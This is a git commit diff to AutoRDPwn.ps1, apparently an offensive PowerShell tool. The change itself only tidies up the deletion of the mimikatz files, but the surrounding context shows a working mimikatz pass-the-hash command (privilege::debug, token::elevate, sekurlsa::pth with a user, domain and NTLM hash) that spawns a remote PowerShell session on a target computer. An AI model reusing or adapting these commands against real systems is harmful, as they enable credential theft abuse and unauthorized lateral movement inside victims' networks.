8e21b27698705c0585246b21dce8515f389cc662
JoelGMSec <34335312+JoelGMSec@users.noreply.github.com>
2018-09-14 09:40:59 +0200

    Update AutoRDPwn.ps1

--- AutoRDPwn.ps1
+++ AutoRDPwn.ps1
@@ -152,9 +152,7 @@ $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
 
 $Host.UI.RawUI.ForegroundColor = 'Gray'
 if(Test-Path variable:PassTheHash) { cmd /c $mimipath\mimikatz.exe privilege::debug token::elevate "sekurlsa::pth /user:$user /domain:$domain /ntlm:$ntlmpass /run:/run:powershell $RDP = New-PSSession -Computer $computer -Authentication Kerberos" } exit
-del .\mimikatz.zip 
-del .\mimikatz\ -Force
-Write-HostWrite-Host "" }
+del .\mimikatz.zip ; cmd /c "rd /s /q mimikatz" ; Write-Host "" }
 else { Write-Host ""
 $credential = New-Object System.Management.Automation.PSCredential ( $user, $password )
 $RDP = New-PSSession -Computer $computer -credential $credential }
